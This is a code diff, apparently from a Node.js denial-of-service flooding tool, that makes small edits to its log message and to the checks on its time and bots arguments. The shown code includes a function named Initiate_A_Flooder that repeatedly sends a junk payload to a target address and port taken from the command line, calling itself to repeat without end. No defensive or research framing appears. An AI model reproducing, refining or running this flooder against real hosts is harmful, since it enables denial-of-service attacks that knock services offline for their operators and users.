@@ -16,7 +16,7 @@ async function Initiate_A_Flooder(){
     const Payload = "!@_n15=-1n1,,5<%@!%.>{424}_;}{[42424242]-[424JIROINj521n9558n15N%1n019505%)(@!%N!%%!()%!^)@!*!^)!N^n66n1l.6[pn1[6pn^NO^1-6-1n61-n6161=-6[1NO^Pn1i60n9i1n69016n16n16nop12k6np1on6k1p<>A<?>W<N,./awn,525n1;5"
 
     Client.send(Payload, Self_Args[1], Self_Args[0])
-    console.log(`${Chalk.grey("[") + Chalk.yellow("WARNING") + Chalk.grey("]")} A payload has been send to ${Self_Args[0]}:${Self_Args[1]}`)
+    console.log(`${Chalk.grey("[") + Chalk.yellow("WARNING") + Chalk.grey("]")} The payload has been send to ${Self_Args[0]}:${Self_Args[1]}`)
     Initiate_A_Flooder()
 }
 
@@ -47,7 +47,7 @@ if(isNaN(Self_Args[1])){
     process.exit()
 }
 
-if(Self_Args[2] == ""){
+if(!Self_Args[2]){
     console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid time.`)
     process.exit()
 }
@@ -57,7 +57,7 @@ if(isNaN(Self_Args[2])){
     process.exit()
 }
 
-if(Self_Args[3] == ""){
+if(!Self_Args[3]){
     console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid bots.`)
     process.exit()
 }
